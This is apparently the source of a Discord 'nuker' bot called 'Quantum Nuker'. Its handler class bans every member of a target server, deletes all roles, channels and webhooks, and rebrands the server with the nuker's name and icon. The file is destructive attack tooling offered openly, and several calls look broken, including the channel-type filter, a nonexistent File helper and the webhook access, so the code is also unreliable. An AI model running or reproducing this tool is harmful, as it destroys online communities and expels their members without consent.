import discord
from typing import Optional, List

class BotHandler:
    def __init__(self, client: discord.Client):
        self.client = client

    async def mass_ban_members(self, guild_id: int) -> dict:
        """Attempts to ban every single member in the target guild."""
        print("\n[STATUS] --- Initiating Mass Ban Sequence... This will be BRUTAL! ---")
        success_count = 0
        fail_ban_reason = "Nuked by Quantum Nuker"
        total_members = 0
      
        try:
            guild = self.client.get_guild(guild_id)
            if not guild:
                return {"status": "error", "message": f"Could not find Guild ID {guild_id}."}

            members: List[discord.Member] = []
            async for member in guild.fetch_members(limit=None):
                members.append(member)

            total_members = len(members)
            print(f"[INFO] Found {total_members} members to process.")

            for member in members:
                try:
                    if member.bot and member != self.client.user:
                        continue

                    await member.ban(reason=fail_ban_reason)
                    success_count += 1
                except discord.Forbidden:
                    print(f"    [WARN] Cannot ban {member.display_name} - Permissions insufficient.")
                except Exception as e:
                    print(f"    [ERROR] Failed to ban {member.display_name}: {e}")

            return {"status": "success", "message": f"Successfully attempted to ban {success_count}/{total_members} members."}

        except discord.Forbidden:
            return {"status": "failure", "message": "Bot lacks 'Ban Members' permission at the server level."}
        except Exception as e:
            return {"status": "failure", "message": f"An unexpected error occurred during mass ban: {e}"}

    async def mass_delete_everything(self, guild_id: int) -> dict:
        """Deletes roles, channels, and attempts to clear webhooks."""
        print("\n[STATUS] --- Initiating Full Server Destruction Sequence... ---")

        try:
            guild = self.client.get_guild(guild_id)
            if not guild:
                 return {"status": "error", "message": f"Could not find Guild ID {guild_id}."}

            role_ids = [r.id for r in guild.roles]
            sorted_roles = sorted(role_ids, reverse=True) 
            deleted_count = 0
            for role_id in sorted_roles:
                try:
                    role = guild.get_role(role_id)
                    if role:
                        await role.delete()
                        print(f"    [DELETED] Role: {role.name}")
                        deleted_count += 1
                except discord.Forbidden:
                    print("    [WARN] Cannot delete a role - Permissions insufficient.")

            channels = [c for c in guild.channels if c.type in [discord.TextChannel, discord.VoiceChannel]]
            print(f"\n[INFO] Found {len(channels)} channels to clean up.")
            for channel in channels:
                try:
                    await channel.delete()
                    print(f"    [DELETED] Channel: {channel.name} ({'Text' if channel.type == discord.TextChannel else 'Voice'})")
                except discord.Forbidden:
                    print("    [WARN] Cannot delete a channel - Permissions insufficient.")
                  
            webhooks_count = 0
            for hook in guild.webhooks:
                try:
                    await hook.delete()
                    print(f"    [DELETED] Webhook: {hook.name}")
                    webhooks_count += 1
                except discord.Forbidden:
                     print("    [WARN] Cannot delete webhook - Permissions insufficient.")

            return {"status": "success", "message": f"Server cleaned! Deleted Roles: {deleted_count}, Channels (approx): {len(channels)}, Webhooks: {webhooks_count}."}

        except discord.Forbidden:
            return {"status": "failure", "message": "Bot lacks 'Manage' permissions (Roles/Channels) at the server level."}
        except Exception as e:
            return {"status": "failure", "message": f"An unexpected error occurred during mass deletion: {e}"}


    async def update_server_branding(self, guild_id: int):
        """Changes name and icon."""
        print("\n[STATUS] --- Attempting Server Branding Overwrite... ---")
        try:
            guild = self.client.get_guild(guild_id)
            if not guild:
                 return "Error: Could not find Guild ID."

            new_name = "Quantum Nuker"
            await guild.edit(name=new_name, reason="Nuking initiated by Rexden.")
            print(f"[SUCCESS] Server name changed to '{new_name}'.")
          
            try:
                icon_url = "https://i.imgur.com/r3xden_nuke_icon.png"
                await guild.edit(icon=discord.utils.File(icon_url))
                print(f"[SUCCESS] Server icon updated.")
            except Exception as e:
                 print(f"[WARN] Could not update icon (Check placeholder URL): {e}")


        except discord.Forbidden:
            return "Failure: Bot lacks 'Manage Server' permission."
        except Exception as e:
            return f"Failure: An unexpected error occurred during branding: {e}"
